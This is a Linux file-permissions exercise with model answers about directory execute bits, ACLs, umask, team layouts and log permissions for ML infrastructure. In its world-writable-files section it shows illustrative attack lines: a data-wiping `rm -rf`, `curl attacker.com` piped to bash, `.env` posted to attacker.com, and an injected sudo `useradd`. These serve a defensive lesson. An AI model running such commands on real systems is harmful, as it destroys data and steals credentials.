# Exercise 02: File Permissions and Access Control - Reflection Questions

## Question 1: Why is the execute permission necessary for directories?

### Answer

The **execute permission (x)** on directories has a different meaning than on files. For directories, it controls **access** to the directory's contents, not execution.

### What Execute Permission Does for Directories

- **With execute (x)**: Can access (cd into) the directory and view file metadata
- **Without execute**: Cannot access directory even if you have read permission

### Example Demonstration

```bash
# Create test directory
mkdir test_dir
echo "content" > test_dir/file.txt

# Remove execute permission
chmod -x test_dir  # Now: rw-rw-r--

# Try to access
cd test_dir
# Result: Permission denied

ls test_dir
# Result: Permission denied

cat test_dir/file.txt
# Result: Permission denied
```

### Permission Combinations Explained

| Read | Write | Execute | Capabilities |
|------|-------|---------|--------------|
| - | - | - | Cannot do anything |
| r | - | - | Can list names but not access files |
| - | - | x | Can access if path known, but not list |
| r | - | x | Can list and access files (common) |
| r | w | - | Can list but not create/delete |
| r | w | x | Full access (755 for dirs) |

### ML Infrastructure Example

```bash
# Models directory - need execute to access files
mkdir models
chmod 755 models        # rwxr-xr-x (standard)

touch models/model.h5
chmod 644 models/model.h5

# Can read model file because directory has execute
cat models/model.h5

# Without directory execute
chmod 644 models        # rw-r--r-- (no execute)
cat models/model.h5     # Permission denied!
```

### Key Insight

**Execute permission on directories = "traversal" or "access" permission**. You need it to:
- Enter the directory with `cd`
- Access files inside (even if you have file permissions)
- View file metadata with `ls -l`

**Summary**: For directories, execute permission is essential for any meaningful access. Without it, the directory is effectively inaccessible even if you can "see" its name.

---

## Question 2: When would you use ACLs instead of traditional permissions?

### Answer

Use **Access Control Lists (ACLs)** when traditional Unix permissions (user/group/other) are too limiting for your access control needs.

### Traditional Permissions Limitations

Traditional permissions have only **3 entities**:
- **User** (owner)
- **Group** (one group)
- **Other** (everyone else)

**Problem**: What if you need different permissions for multiple users or groups?

### ACL Use Cases in ML Infrastructure

#### Case 1: Multiple Teams Need Different Access

**Scenario**: Dataset shared across teams with different permissions

```bash
# Traditional approach (doesn't work well)
# Can only set ONE group

# ACL approach (flexible)
mkdir shared_dataset
chmod 755 shared_dataset

# Data engineers: full access
setfacl -m g:data_engineers:rwx shared_dataset

# ML researchers: read + execute
setfacl -m g:ml_researchers:rx shared_dataset

# Analysts: read only
setfacl -m g:analysts:r shared_dataset

# Verify
getfacl shared_dataset
# user::rwx
# group::r-x
# group:data_engineers:rwx
# group:ml_researchers:r-x
# group:analysts:r--
```

#### Case 2: Specific User Needs Special Access

**Scenario**: External consultant needs access to specific models

```bash
# Grant specific user access without changing group
setfacl -m u:consultant_john:rx models/production/

# Consultant can access without being in main group
```

#### Case 3: Default Permissions for New Files

**Scenario**: Ensure all files created in directory inherit permissions

```bash
# Set default ACL for experiments directory
setfacl -d -m g:ml_team:rw experiments/

# Now any file created automatically gets group write
touch experiments/new_experiment.yaml
getfacl experiments/new_experiment.yaml
# Shows group:ml_team:rw automatically applied
```

#### Case 4: Granular Model Registry Access

**Scenario**: Different teams need different access levels to models

```bash
models/
├── research/      # Research team: full access
├── staging/       # ML engineers: full, researchers: read
└── production/    # MLOps: full, others: read

# Set ACLs
setfacl -m g:research:rwx models/research/
setfacl -m g:ml_engineers:rwx models/staging/
setfacl -m g:research:rx models/staging/
setfacl -m g:mlops:rwx models/production/
setfacl -m g:ml_engineers:rx models/production/
setfacl -m g:research:rx models/production/
```

### When NOT to Use ACLs

- **Simple scenarios**: Traditional permissions are sufficient
- **No ACL support**: Filesystem doesn't support ACLs
- **Portability**: ACLs not portable across all systems
- **Complexity**: Adds management overhead

### Traditional Permissions vs ACLs

| Feature | Traditional | ACLs |
|---------|-------------|------|
| Number of groups | 1 | Unlimited |
| Specific users | Owner only | Multiple |
| Default permissions | umask | Default ACLs |
| Complexity | Simple | More complex |
| Portability | Universal | Filesystem-dependent |
| Best for | Simple scenarios | Complex access control |

### Summary

Use ACLs when you need:
- Multiple groups with different permissions
- Specific user exceptions
- Default permissions for new files
- Fine-grained access control

Use traditional permissions when:
- Simple user/group/other model suffices
- Maximum portability needed
- Simplicity is priority

---

## Question 3: How does umask affect newly created files?

### Answer

**umask** (user file-creation mode mask) **subtracts permissions** from default permissions when creating new files and directories.

### Default Permissions (Before umask)

- **Files**: 666 (rw-rw-rw-)
- **Directories**: 777 (rwxrwxrwx)

### umask Calculation

```
Final Permission = Default - umask

Example: umask 0022
Files:     666 - 022 = 644 (rw-r--r--)
Dirs:      777 - 022 = 755 (rwxr-xr-x)
```

### Common umask Values

#### umask 0022 (Standard/Default)
```bash
umask 0022
touch file.txt
mkdir dir
ls -l
# -rw-r--r--  file.txt   (644)
# drwxr-xr-x  dir        (755)

# Files: Owner can write, all can read
# Dirs: Owner can modify, all can access/read
```

#### umask 0002 (Collaborative/Team-Friendly)
```bash
umask 0002
touch shared_data.csv
mkdir shared_experiments
ls -l
# -rw-rw-r--  shared_data.csv        (664)
# drwxrwxr-x  shared_experiments     (775)

# Files: Owner and group can write
# Dirs: Owner and group can modify
```

#### umask 0077 (Secure/Private)
```bash
umask 0077
touch secret.key
mkdir private_dir
ls -l
# -rw-------  secret.key    (600)
# drwx------  private_dir   (700)

# Files: Only owner can access
# Dirs: Only owner can access
```

### ML Infrastructure Examples

#### Scenario 1: Team Collaboration

```bash
# Set collaborative umask in ~/.bashrc
umask 0002

# Work on shared project
cd /shared/ml-project
touch experiment_results.csv
mkdir new_experiment

# Files automatically group-writable
ls -l experiment_results.csv
# -rw-rw-r-- (team can edit)
```

#### Scenario 2: Creating Secrets

```bash
# Temporarily use secure umask
OLD_UMASK=$(umask)
umask 0077

# Create secret file
cat > api_keys.yaml << EOF
aws_key: secret123
openai_key: secret456
EOF

# File automatically private
ls -l api_keys.yaml
# -rw------- (owner only)

# Restore umask
umask $OLD_UMASK
```

#### Scenario 3: Mixed Environment

```bash
# Default umask for general work
umask 0022

# Function to create secure files
create_secure() {
    local old=$(umask)
    umask 0077
    cat > "$1"
    umask $old
}

# Function to create collaborative files
create_shared() {
    local old=$(umask)
    umask 0002
    cat > "$1"
    umask $old
}

# Use as needed
echo "data" | create_secure credentials.txt    # 600
echo "data" | create_shared shared_data.csv    # 664
```

### Setting umask Permanently

```bash
# In ~/.bashrc
umask 0002  # Collaborative

# Or per-project
if [[ "$PWD" == /shared/ml-projects/* ]]; then
    umask 0002  # Collaborative in shared area
else
    umask 0022  # Standard elsewhere
fi
```

### umask Calculation Table

| umask | File Perm | Dir Perm | Use Case |
|-------|-----------|----------|----------|
| 0000 | 666 (rw-rw-rw-) | 777 (rwxrwxrwx) | No restriction (dangerous) |
| 0002 | 664 (rw-rw-r--) | 775 (rwxrwxr-x) | Team collaboration |
| 0022 | 644 (rw-r--r--) | 755 (rwxr-xr-x) | Standard (default) |
| 0027 | 640 (rw-r-----) | 750 (rwxr-x---) | Group read-only |
| 0077 | 600 (rw-------) | 700 (rwx------) | Private/secure |

### Key Points

1. **umask subtracts from defaults**, doesn't add
2. **Affects new files only**, not existing ones
3. **Per-session setting** unless made permanent
4. **Different for files vs directories** (execute bit)
5. **Can be overridden** with explicit chmod

### Summary

umask is a critical tool for ML teams:
- Use **0002** for collaborative work (team can edit)
- Use **0022** for general purpose (standard)
- Use **0077** for sensitive data (private)
- Set in **~/.bashrc** for permanent effect
- Override temporarily for special cases

---

## Question 4: What security risks arise from world-writable files?

### Answer

**World-writable files** (permission bit 002 set) allow **any user** on the system to modify the file. This poses serious security risks.

### Major Security Risks

#### 1. **Data Corruption**

```bash
# World-writable model file
-rw-rw-rw- model_v1.h5  # Anyone can modify

# Malicious or accidental corruption
echo "corrupted" > model_v1.h5  # Any user can overwrite
```

**Impact**: Production models corrupted, training data tampered with, experimental results invalidated.

#### 2. **Code Injection**

```bash
# World-writable training script
-rwxrwxrwx train.py  # Anyone can modify and it's executable

# Attacker injects malicious code
cat >> train.py << 'EOF'
import os
os.system("rm -rf /data/*")  # Malicious code
os.system("curl attacker.com/steal | bash")  # Backdoor
EOF

# Next time script runs, malicious code executes
python train.py  # Runs with your credentials
```

**Impact**: Data theft, system compromise, credential leakage.

#### 3. **Privilege Escalation**

```bash
# World-writable script run by root/sudo
-rwxrwxrwx /opt/ml/deploy_model.sh

# Attacker modifies script
echo "useradd -m -G sudo attacker" >> /opt/ml/deploy_model.sh

# When admin runs script with sudo
sudo /opt/ml/deploy_model.sh
# Attacker gains sudo access
```

**Impact**: Full system compromise, unauthorized access.

#### 4. **Log Tampering**

```bash
# World-writable log file
-rw-rw-rw- training.log

# Attacker covers tracks
> training.log  # Clear evidence
echo "Everything normal" >> training.log
```

**Impact**: Can't detect security breaches, lost audit trail.

#### 5. **Configuration Hijacking**

```bash
# World-writable config
-rw-rw-rw- ml_config.yaml

# Attacker changes API endpoint
cat > ml_config.yaml << EOF
api_endpoint: http://attacker.com/api  # Redirect data
aws_region: us-east-1
EOF

# ML pipeline sends data to attacker
```

**Impact**: Data exfiltration, service disruption.

### Real-World ML Infrastructure Attacks

#### Attack 1: Model Poisoning

```bash
# Scenario: World-writable training data
chmod 666 datasets/train.csv

# Attacker injects poisoned samples
# Model learns attacker's backdoor
# Deployed model has hidden vulnerabilities
```

#### Attack 2: Credential Theft

```bash
# Scenario: World-writable credentials
chmod 666 .env

# Attacker reads and exfiltrates
cat .env | curl -X POST attacker.com/collect
```

#### Attack 3: Supply Chain Attack

```bash
# Scenario: World-writable requirements.txt
chmod 666 requirements.txt

# Attacker adds malicious package
echo "malicious-package==1.0.0" >> requirements.txt

# Next pip install compromises environment
```

### Finding World-Writable Files

```bash
# Find world-writable files
find . -type f -perm -002

# Find world-writable directories
find . -type d -perm -002

# Find and fix
find . -perm -002 -exec chmod o-w {} \;
```

### Prevention Strategies

#### 1. **Use Proper umask**
```bash
umask 0022  # Prevents world-writable by default
```

#### 2. **Regular Audits**
```bash
# Automated security audit
./audit_permissions.sh /ml-project
```

#### 3. **Principle of Least Privilege**
```bash
# Only necessary permissions
chmod 644 config.yaml   # Not 666
chmod 755 script.sh     # Not 777
chmod 600 secret.key    # Not 644
```

#### 4. **File System Monitoring**
```bash
# Monitor for permission changes
inotifywait -m -e attrib /ml-project/
```

#### 5. **Immutable Files**
```bash
# Make critical files immutable
sudo chattr +i production_model.h5
# Now cannot be modified even by owner
```

### Security Checklist

- [ ] No world-writable files (check with `find . -perm -002`)
- [ ] Scripts are 755 max (not 777)
- [ ] Configs are 644 max (not 666)
- [ ] Secrets are 600 (not world-readable)
- [ ] Regular permission audits
- [ ] Proper umask configured
- [ ] Monitoring in place

### Summary

World-writable files are a **critical security vulnerability**:
- **Any user can modify** → Data corruption, code injection
- **Hard to detect** → Attackers can cover tracks
- **Cascading impact** → One compromise leads to more
- **Prevention is key** → Proper umask, regular audits, principle of least privilege

**Never use 777 or 666 permissions in production ML systems.**

---

## Question 5: How would you structure permissions for a 10-person ML team?

### Answer

For a 10-person ML team, implement a **group-based permission structure** with **role-specific access control**.

### Team Structure & Roles

Assume team composition:
- **3 ML Engineers**: Model development, training
- **2 Data Engineers**: Data processing, pipelines
- **2 ML Researchers**: Experimentation, research
- **2 MLOps Engineers**: Deployment, infrastructure
- **1 Team Lead**: Oversight, coordination

### Group-Based Strategy

#### 1. Create Groups

```bash
# Primary group: all team members
sudo groupadd mlteam

# Role-specific groups
sudo groupadd ml_engineers
sudo groupadd data_engineers
sudo groupadd ml_researchers
sudo groupadd mlops

# Add users to groups
sudo usermod -a -G mlteam,ml_engineers alice
sudo usermod -a -G mlteam,ml_engineers bob
sudo usermod -a -G mlteam,ml_engineers charlie

sudo usermod -a -G mlteam,data_engineers david
sudo usermod -a -G mlteam,data_engineers eve

sudo usermod -a -G mlteam,ml_researchers frank
sudo usermod -a -G mlteam,ml_researchers grace

sudo usermod -a -G mlteam,mlops henry
sudo usermod -a -G mlteam,mlops iris

sudo usermod -a -G mlteam,ml_engineers,mlops,data_engineers lead
```

#### 2. Directory Structure with Permissions

```
/shared/ml-project/
├── datasets/
│   ├── raw/           [755, data_engineers]  # DE write, all read
│   ├── processed/     [775, mlteam]          # Team collaborative
│   └── external/      [755, root]            # Read-only
├── models/
│   ├── experiments/   [775, ml_engineers]    # ML eng collaborative
│   ├── checkpoints/   [775, mlteam]          # Team shares
│   └── production/    [755, mlops]           # MLOps controlled
├── notebooks/         [775, mlteam]          # All collaborate
├── src/
│   ├── training/      [775, ml_engineers]    # ML eng develop
│   ├── deployment/    [775, mlops]           # MLOps develop
│   └── pipelines/     [775, data_engineers]  # DE develop
├── configs/
│   ├── experiments/   [775, ml_researchers]  # Researchers configure
│   ├── production/    [750, mlops]           # MLOps controlled
│   └── secrets/       [700, lead]            # Lead only
├── docs/              [775, mlteam]          # All contribute
├── logs/              [755, mlops]           # MLOps write, all read
└── shared/            [777, mlteam]          # Scratchpad (temporary)
```

#### 3. Implementation Script

```bash
#!/bin/bash
# setup_team_permissions.sh

BASE="/shared/ml-project"

# Create structure
mkdir -p $BASE/{datasets/{raw,processed,external},models/{experiments,checkpoints,production},notebooks,src/{training,deployment,pipelines},configs/{experiments,production,secrets},docs,logs,shared}

# Set group ownership
sudo chgrp -R mlteam $BASE

# Datasets
sudo chown -R :data_engineers $BASE/datasets/raw
chmod 755 $BASE/datasets/raw
chmod 775 $BASE/datasets/processed
chmod 755 $BASE/datasets/external

# Models
sudo chown -R :ml_engineers $BASE/models/experiments
chmod 775 $BASE/models/experiments
chmod 775 $BASE/models/checkpoints
sudo chown -R :mlops $BASE/models/production
chmod 755 $BASE/models/production

# Source code
sudo chown -R :ml_engineers $BASE/src/training
chmod 775 $BASE/src/training
sudo chown -R :mlops $BASE/src/deployment
chmod 775 $BASE/src/deployment
sudo chown -R :data_engineers $BASE/src/pipelines
chmod 775 $BASE/src/pipelines

# Configs
sudo chown -R :ml_researchers $BASE/configs/experiments
chmod 775 $BASE/configs/experiments
sudo chown -R :mlops $BASE/configs/production
chmod 750 $BASE/configs/production
sudo chown -R :lead $BASE/configs/secrets
chmod 700 $BASE/configs/secrets

# Collaborative areas
chmod 775 $BASE/notebooks
chmod 775 $BASE/docs
chmod 775 $BASE/shared

# Logs
sudo chown -R :mlops $BASE/logs
chmod 755 $BASE/logs

# Set default ACLs for new files
setfacl -d -m g:mlteam:rw $BASE/notebooks
setfacl -d -m g:mlteam:rw $BASE/docs
setfacl -d -m g:ml_engineers:rw $BASE/models/experiments
setfacl -d -m g:mlteam:rw $BASE/models/checkpoints

echo "Team permissions configured"
```

#### 4. Access Control Matrix

| Area | ML Eng | Data Eng | Researcher | MLOps | Lead |
|------|--------|----------|------------|-------|------|
| datasets/raw | Read | Read/Write | Read | Read | Full |
| datasets/processed | Read/Write | Read/Write | Read/Write | Read | Full |
| models/experiments | Read/Write | Read | Read | Read | Full |
| models/checkpoints | Read/Write | Read | Read/Write | Read/Write | Full |
| models/production | Read | Read | Read | Read/Write | Full |
| notebooks | Read/Write | Read/Write | Read/Write | Read/Write | Full |
| src/training | Read/Write | Read | Read | Read | Full |
| src/deployment | Read | Read | Read | Read/Write | Full |
| configs/experiments | Read | Read | Read/Write | Read | Full |
| configs/production | Read | Read | Read | Read/Write | Full |
| configs/secrets | - | - | - | - | Full |

#### 5. Workflow Examples

**ML Engineer Workflow**:
```bash
# Can develop models
cd /shared/ml-project/src/training
vim train_model.py  # Can edit

# Can save experiments
cp model.h5 /shared/ml-project/models/experiments/  # Success

# Cannot modify production
cp model.h5 /shared/ml-project/models/production/  # Permission denied
```

**MLOps Workflow**:
```bash
# Can promote models to production
cp /shared/ml-project/models/checkpoints/best.h5 \
   /shared/ml-project/models/production/v1.2.3.h5  # Success

# Can configure deployment
vim /shared/ml-project/configs/production/deploy.yaml  # Success

# Cannot access secrets (unless lead)
cat /shared/ml-project/configs/secrets/api_keys.yaml  # Permission denied
```

**Data Engineer Workflow**:
```bash
# Can update raw data
cp new_data.csv /shared/ml-project/datasets/raw/  # Success

# Can process data
python process.py \
  --input /shared/ml-project/datasets/raw/ \
  --output /shared/ml-project/datasets/processed/  # Success
```

#### 6. Best Practices

1. **Set Team umask**:
```bash
# In team's ~/.bashrc
umask 0002  # Collaborative
```

2. **Regular Audits**:
```bash
# Weekly permission review
./audit_team_permissions.sh
```

3. **Document Policies**:
```markdown
# PERMISSIONS_POLICY.md
- All team members in `mlteam` group
- Collaborative areas: 775/664
- Production: Controlled by MLOps
- Secrets: Team lead only
```

4. **Onboarding Checklist**:
```bash
# New team member script
./onboard_user.sh username role
# Adds to appropriate groups
# Sets up home directory
# Configures umask
```

5. **Rotation Strategy**:
```bash
# Rotate secrets quarterly
# Update configs/secrets/
# Only lead has access
```

### Summary

For a 10-person ML team:
- **Use group-based permissions** with role-specific groups
- **Collaborative areas** (775/664) for teamwork
- **Controlled areas** (755/644) for production
- **Private areas** (700/600) for secrets
- **Regular audits** to maintain security
- **Clear documentation** of policies
- **Automated onboarding** for consistency

This structure balances collaboration with security, appropriate for professional ML teams.

---

## Question 6: Why should production models be read-only?

### Answer

Production models should be **read-only (444 or 644)** to prevent accidental or malicious modification while deployed.

### Key Reasons

#### 1. **Prevent Accidental Modification**

```bash
# Production model (read-only)
-r--r--r-- model_v1.2.3.h5

# Safe: Cannot accidentally overwrite
cp experimental_model.h5 model_v1.2.3.h5
# cp: cannot create regular file: Permission denied

# Safe: Scripts can't modify
echo "data" >> model_v1.2.3.h5
# bash: model_v1.2.3.h5: Permission denied
```

Without read-only:
```bash
# Writable model (dangerous)
-rw-rw-r-- model_v1.2.3.h5

# Accidental overwrite
cp test_model.h5 model_v1.2.3.h5  # Oops! Production corrupted
```

#### 2. **Audit and Compliance**

```bash
# Read-only ensures integrity
# Can verify model hasn't changed
md5sum production/model_v1.2.3.h5 > production/model_v1.2.3.h5.md5

# Later, verify
md5sum -c production/model_v1.2.3.h5.md5
# production/model_v1.2.3.h5: OK

# If writable, checksum becomes meaningless
```

#### 3. **Deployment Safety**

```bash
# Deployment script
deploy_model() {
    local model=$1

    # Copy to production (read-only)
    cp "$model" /models/production/
    chmod 444 /models/production/$(basename "$model")

    # Generate checksum
    cd /models/production
    md5sum $(basename "$model") > $(basename "$model").md5
}

# Models immutable after deployment
# Reproducible inference
# Rollback uses exact same model
```

#### 4. **Version Control**

```bash
models/production/
├── v1.0.0.h5  (444 - deployed 2024-01)
├── v1.1.0.h5  (444 - deployed 2024-03)
├── v1.2.0.h5  (444 - deployed 2024-06)
└── v1.2.3.h5  (444 - current)

# Each version immutable
# Easy rollback
# Clear history
```

#### 5. **Security**

Writable models open security vulnerabilities:

```bash
# If writable, attacker can inject backdoor
# Model performs normally but:
# - Leaks data
# - Misclassifies specific inputs
# - Contains hidden functionality

# Read-only prevents post-deployment tampering
chmod 444 production_model.h5
# Now attacker must compromise deployment process
# Much harder than modifying existing file
```

### Production Deployment Workflow

```bash
#!/bin/bash
# deploy_to_production.sh

SOURCE_MODEL="$1"
VERSION="$2"
PROD_DIR="/models/production"

# Validate model
python validate_model.py "$SOURCE_MODEL" || exit 1

# Create production copy
cp "$SOURCE_MODEL" "$PROD_DIR/model_${VERSION}.h5"

# Make read-only
chmod 444 "$PROD_DIR/model_${VERSION}.h5"

# Generate metadata
cat > "$PROD_DIR/model_${VERSION}.json" << EOF
{
  "version": "$VERSION",
  "deployed_at": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "deployed_by": "$USER",
  "source": "$SOURCE_MODEL",
  "checksum": "$(md5sum $PROD_DIR/model_${VERSION}.h5 | cut -d' ' -f1)"
}
EOF

chmod 444 "$PROD_DIR/model_${VERSION}.json"

echo "Model deployed: model_${VERSION}.h5 (read-only)"
```

### Handling Updates

```bash
# To update production model:
# 1. Deploy new version (don't modify existing)

./deploy_to_production.sh checkpoints/best.h5 v1.3.0

# 2. Update service to use new model (atomic swap)
ln -sf model_v1.3.0.h5 current_model.h5

# 3. Old model remains unchanged (rollback possible)
```

### Exceptions (Temporary Write Access)

If you need to modify (rare):

```bash
# Add write permission temporarily
chmod u+w production/model.h5

# Make modification
fix_model.py production/model.h5

# Remove write permission
chmod 444 production/model.h5

# Document change
echo "$(date): Emergency fix applied" >> production/CHANGES.log
```

### Best Practices

1. **Strict Read-Only** (444 or 400):
```bash
chmod 444 model.h5  # Readable by all (if needed)
chmod 400 model.h5  # Owner only (more secure)
```

2. **Checksum Verification**:
```bash
# Generate on deployment
md5sum model.h5 > model.h5.md5

# Verify before inference
md5sum -c model.h5.md5 || alert_security_team
```

3. **Separate Environments**:
```bash
staging/models/     # writable for testing
production/models/  # read-only after deployment
```

4. **Automated Deployment**:
```bash
# CI/CD pipeline
# - Build model
# - Validate
# - Test
# - Deploy with read-only permissions
# - Never manual changes
```

### Summary

Production models should be read-only because:
- **Prevents accidents**: Can't accidentally overwrite
- **Ensures integrity**: Model doesn't change
- **Audit compliance**: Verifiable checksums
- **Security**: Prevents tampering
- **Version control**: Clear deployment history
- **Rollback safety**: Original models unchanged

**Best permission: 444 (r--r--r--) or 400 (r--------) for sensitive models**

---

## Question 7: What permissions should log files have and why?

### Answer

Log files should typically have **644 permissions (rw-r--r--)**: owner writes, all read.

### Rationale

#### 1. **Owner (Application) Writes**

```bash
# Application process writes logs
# Needs write permission
-rw-r--r-- training.log  # Owner (ml-service) can write

# Application appends logs
echo "[INFO] Training started" >> training.log  # Success
```

#### 2. **Team Reads for Debugging**

```bash
# Team members need to read logs for debugging
-rw-r--r-- training.log  # All can read

# ML engineer investigates
tail -f training.log
grep "ERROR" training.log

# Data engineer monitors
watch -n 1 tail training.log
```

#### 3. **No Write Access for Others**

```bash
# Others should NOT write
# Prevents log tampering and confusion

-rw-r--r-- training.log  # Others: read-only

# Attacker cannot cover tracks
echo "" > training.log  # Permission denied
```

### Common Log Permission Patterns

#### Pattern 1: Standard Application Logs (644)

```bash
# Service logs
-rw-r--r-- app.log         # Owner writes, all read
-rw-r--r-- training.log
-rw-r--r-- inference.log

chmod 644 /var/log/ml-service/*.log
```

**Use case**: Team needs to debug, monitor progress

#### Pattern 2: Sensitive Logs (640)

```bash
# Logs containing sensitive data
-rw-r----- audit.log       # Owner writes, group reads, no others

# Only authorized team members
chgrp security audit.log
chmod 640 audit.log

# Contains: API calls, user data, credentials (hashed)
```

**Use case**: Compliance, security logs

#### Pattern 3: System Logs (644 or 600)

```bash
# System-level logs
-rw-r--r-- /var/log/syslog   # 644 - all read
-rw------- /var/log/auth.log # 600 - root only

# Auth logs: private
chmod 600 /var/log/auth.log
```

**Use case**: System administration, security

#### Pattern 4: Rotating Logs with Compression (644 → 444)

```bash
# Active log
-rw-r--r-- training.log          # 644 - being written

# Rotated logs (compressed, read-only)
-r--r--r-- training.log.1.gz     # 444 - archived
-r--r--r-- training.log.2.gz
-r--r--r-- training.log.3.gz

# After rotation, make read-only
find /var/log/ml-service -name "*.gz" -exec chmod 444 {} \;
```

**Use case**: Log rotation, archival

### ML Infrastructure Log Scenarios

#### Scenario 1: Training Logs

```bash
mkdir -p /var/log/ml-training
chown ml-user:mlteam /var/log/ml-training
chmod 755 /var/log/ml-training

# Individual log files
touch /var/log/ml-training/experiment_001.log
chmod 644 /var/log/ml-training/experiment_001.log

# Anyone can read progress
tail -f /var/log/ml-training/experiment_001.log
```

#### Scenario 2: Inference API Logs

```bash
# API access logs (sensitive)
-rw-r----- api_access.log     # 640
chgrp mlops api_access.log

# API error logs (debugging)
-rw-r--r-- api_errors.log     # 644

# Only MLOps sees access patterns
# All developers can debug errors
```

#### Scenario 3: Audit Logs

```bash
# Compliance audit logs
mkdir -p /var/log/ml-audit
chmod 750 /var/log/ml-audit          # Only owner and group
chgrp compliance /var/log/ml-audit

# Audit files
-rw-r----- model_access.log          # 640
-rw-r----- data_access.log
-rw-r----- config_changes.log

# Only compliance team can read
# Application writes, compliance audits
```

### Log Management Script

```bash
#!/bin/bash
# setup_logging_permissions.sh

LOG_DIR="/var/log/ml-service"
LOG_USER="ml-service"
LOG_GROUP="mlteam"

# Create log directory
mkdir -p "$LOG_DIR"
chown "$LOG_USER:$LOG_GROUP" "$LOG_DIR"
chmod 755 "$LOG_DIR"

# Set permissions for existing logs
find "$LOG_DIR" -type f -name "*.log" -exec chmod 644 {} \;

# Compressed logs: read-only
find "$LOG_DIR" -type f -name "*.gz" -exec chmod 444 {} \;

# Sensitive logs
find "$LOG_DIR" -type f -name "*audit*" -exec chmod 640 {} \;
find "$LOG_DIR" -type f -name "*auth*" -exec chmod 640 {} \;

# Log rotation config
cat > /etc/logrotate.d/ml-service << 'EOF'
/var/log/ml-service/*.log {
    daily
    rotate 14
    compress
    delaycompress
    notifempty
    create 644 ml-service mlteam
    postrotate
        chmod 444 /var/log/ml-service/*.gz
    endscript
}
EOF

echo "Logging permissions configured"
```

### Security Considerations

#### Bad: World-Writable Logs
```bash
# NEVER do this
chmod 666 application.log  # ✗ Anyone can tamper

# Attacker can:
# - Delete logs (cover tracks)
# - Inject false entries
# - Fill disk with garbage
```

#### Bad: No Read Access
```bash
# Too restrictive
chmod 600 application.log  # ✗ Team cannot debug

# Team cannot:
# - Monitor training progress
# - Debug errors
# - Troubleshoot issues
```

#### Good: Balanced Permissions
```bash
# Balanced approach
chmod 644 application.log  # ✓ Owner writes, team reads

# Benefits:
# - Team can debug
# - Others cannot tamper
# - Proper audit trail
```

### Log Directory Structure

```
/var/log/ml-service/          (755 - ml-service:mlteam)
├── training/                 (755)
│   ├── experiment_001.log    (644 - in progress)
│   ├── experiment_002.log    (644)
│   └── old/                  (755)
│       ├── exp_001.log.gz    (444 - archived)
│       └── exp_002.log.gz    (444)
├── inference/                (755)
│   ├── api_access.log        (640 - sensitive)
│   ├── api_errors.log        (644 - debugging)
│   └── performance.log       (644)
├── audit/                    (750 - restricted)
│   ├── model_access.log      (640)
│   └── data_access.log       (640)
└── system/                   (755)
    ├── health.log            (644)
    └── metrics.log           (644)
```

### Best Practices Checklist

- [ ] Active logs: 644 (owner writes, all read)
- [ ] Sensitive logs: 640 (owner writes, group reads)
- [ ] Archived logs: 444 (read-only)
- [ ] Log directory: 755 (accessible)
- [ ] Log rotation configured
- [ ] Permissions in logrotate config
- [ ] Regular audits of log access
- [ ] No world-writable logs (✗ 666)

### Summary

Log files should have **644 permissions** because:
- **Owner writes**: Application can log events
- **Team reads**: Developers can debug, monitor
- **No tampering**: Others cannot modify logs
- **Balanced**: Security + accessibility

**Special cases**:
- Sensitive logs: **640** (group-only read)
- Archived logs: **444** (read-only)
- Audit logs: **640** (restricted access)

Proper log permissions enable effective debugging while maintaining security and audit integrity.

---

*Exercise 02: File Permissions and Access Control - Completed*
